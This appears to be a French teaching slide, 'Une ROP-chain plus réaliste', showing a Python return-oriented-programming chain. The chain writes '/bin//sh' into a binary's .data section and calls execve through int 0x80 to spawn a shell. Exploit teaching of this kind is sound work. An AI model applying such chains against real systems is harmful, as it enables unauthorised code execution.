## Une ROP-chain plus réaliste

``` python
p = ''
p += pk(0x0806f4ea) # pop edx ; ret
p += pk(0x080eb060) # @ .data
p += pk(0x080bb926) # pop eax ; ret
p += '/bin'
p += pk(0x08097936) # mov dword ptr [edx], eax ; pop ebx ; ret
p += pk(0x41414141) # padding
p += pk(0x0806f4ea) # pop edx ; ret
p += pk(0x080eb064) # @ .data + 4
p += pk(0x080bb926) # pop eax ; ret
p += '//sh'
p += pk(0x08097936) # mov dword ptr [edx], eax ; pop ebx ; ret
p += pk(0x41414141) # padding
p += pk(0x0806f4ea) # pop edx ; ret
p += pk(0x080eb068) # @ .data + 8
p += pk(0x08054f10) # xor eax, eax ; ret
p += pk(0x08097936) # mov dword ptr [edx], eax ; pop ebx ; ret
p += pk(0x41414141) # padding
p += pk(0x080481c9) # pop ebx ; ret
p += pk(0x080eb060) # @ .data
p += pk(0x0806f511) # pop ecx ; pop ebx ; ret
p += pk(0x080eb068) # @ .data + 8
p += pk(0x080eb060) # padding without overwrite ebx
p += pk(0x0806f4ea) # pop edx ; ret
p += pk(0x080eb068) # @ .data + 8
p += pk(0x08054f10) # xor eax, eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x080499c1) # int 0x80
```

<!-- .elements class="stretch" -->
